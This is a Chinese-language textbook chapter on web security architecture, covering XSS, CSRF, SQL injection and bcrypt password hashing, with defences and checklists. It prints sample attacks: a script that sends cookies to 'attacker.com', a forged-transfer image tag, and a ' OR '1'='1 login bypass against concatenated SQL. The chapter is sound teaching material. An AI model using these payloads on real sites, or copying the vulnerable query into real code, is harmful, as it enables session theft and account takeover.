# 第6章 安全架构——攻防的艺术

> **技术专家重写**
>
> 架构的高性能、高可用、可伸缩，在安全攻击面前脆弱得不堪一击。**一条 SQL 注入可以让你的数据库被拖库。一条 XSS 攻击可以窃取用户的 Cookie。**

---

## 6.1 XSS——跨站脚本攻击

### 6.1.1 攻击原理

用户提交评论：`<script>fetch('http://attacker.com?cookie='+document.cookie)</script>`

网站没有过滤这段内容——直接渲染。每个浏览这个评论的用户——脚本执行——Cookie 被发送到攻击者服务器。攻击者用这些 Cookie 冒充用户。

### 6.1.2 防御：HTML 转义

```
<script> → &lt;script&gt;  (浏览器渲染为文本，不是HTML标签)
```

React/Vue 的 `{variable}` 默认做了转义。但如果你用 `dangerouslySetInnerHTML` 或后端直接拼接 HTML——你需要手动转义。

---

## 6.2 CSRF——跨站请求伪造

### 6.2.1 攻击原理

用户登录了 A 银行。浏览器保存了 Cookie。用户浏览 B 网站——B 网站嵌入了 `<img src="http://A.bank/transfer?to=hacker&amount=10000">`。浏览器自动发送请求（携带着 A 银行的 Cookie）→ 攻击成功。

### 6.2.2 防御：CSRF Token

每次表单提交携带唯一 Token——服务器验证 Token。攻击者无法获取这个 Token（因为它在表单中，不在 Cookie 中）。

## 6.3 SQL 注入

### 6.3.1 攻击原理

```java
String sql = "SELECT * FROM users WHERE name='" + username + "' AND password='" + password + "'";
```

攻击者输入：username = `admin`，password = `' OR '1'='1`。

拼出来的 SQL：`SELECT * FROM users WHERE name='admin' AND password='' OR '1'='1'`。`'1'='1'` 永远为真 → 绕过密码验证 → 攻击者以 admin 登录。

### 6.3.2 防御：参数化查询

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name=? AND password=?");
ps.setString(1, username);
ps.setString(2, password);
```

SQL 结构与数据分离——用户输入不会改变 SQL 语义。

## 6.4 安全的实践清单

| 措施 | 防御什么 | 复杂度 |
|------|---------|--------|
| HTML 转义 | XSS | 低（前端框架默认） |
| CSRF Token | CSRF | 低（Spring Security 内置） |
| PreparedStatement | SQL 注入 | 低（ORM 默认） |
| HTTPS (TLS 1.3) | 中间人攻击 | 低（证书+配置） |
| 不输出 Stack Trace | 信息泄漏 | 低（一行配置） |
| 最小权限 | 内部攻击 | 中（架构设计） |

## 6.5 加密——密码应该怎么存？

### 6.5.1 MD5 为什么不能用来存密码？

```sql
INSERT INTO users (name, password) VALUES ('admin', MD5('123456'));
-- 存的是 e10adc3949ba59abbe56e057f20f883e
```

问题：MD5 是**哈希函数**，不是**密码哈希函数**。它太快了——一台 GPU 每秒可以算 10 亿次 MD5。攻击者拿到你的数据库后，1 秒就能暴力破解 10 亿个密码。而且有彩虹表——预计算了大量 MD5 值——直接查表秒出原密码。

**SHA-1、SHA-256 同样的问题**——它们都是"通用哈希"，太快。

### 6.5.2 bcrypt——故意慢的密码哈希

```
bcrypt(password, salt, rounds=10):
  rounds=10 → 约 100ms/次
  增加 rounds → 指数级增长时间
  同样 GPU 1 秒 → 只有 10 次（MD5 是 10 亿次）
```

**慢=安全**。攻击者想暴力破解——要等 N 年，不是 N 秒。bcrypt 的 rounds 参数就是故意让你慢的——合法用户登录只等 100ms（无感知），攻击者暴力猜密码要等数年。

### 6.5.3 盐值（Salt）——让相同密码不同哈希

```
用户 A: password="123456", salt="a3f2" → bcrypt = "$2a$10$a3f2..."
用户 B: password="123456", salt="b7c1" → bcrypt = "$2a$10$b7c1..."
```

两个用户的密码相同——但生成完全不同的哈希。攻击者不能"一次破解,万用"——每个用户都需要单独暴力破解。

### 6.5.4 你的生产方案

```
bcrypt + salt + rounds=12（约 200ms）
存储格式: $2a$12$salt值$哈希值
验证: bcrypt.compare(password, stored_hash)
```

**不要自己造轮子**——Spring Security 的 `BCryptPasswordEncoder` 就是这套方案。直接用，不要手写密码哈希逻辑。

## 6.6 生产安全清单——不只防御攻击

| 威胁 | 防御 | 投入 |
|------|------|------|
| XSS | 前端框架自动转义 + CSP Header | 低 |
| CSRF | Spring Security CSRF Token | 低 |
| SQL注入 | ORM参数化查询 | 低 |
| 密码拖库 | bcrypt + salt + rounds=12 | 低 |
| 中间人 | TLS 1.3 + HSTS | 低（免费证书） |
| DDoS | CDN + WAF + 限流 | 中（云服务商提供） |
| 内部威胁 | 最小权限 + 审计日志 + 双因子认证 | 中（流程管控） |
| 日志泄漏 | 敏感字段脱敏 + 日志级别管控 | 低 |

**安全不是"添加功能"——是架构的一部分。** 从代码的第一行就要考虑"如果这行代码被 XSS 利用怎么办"，而不是上线后被黑了再补。
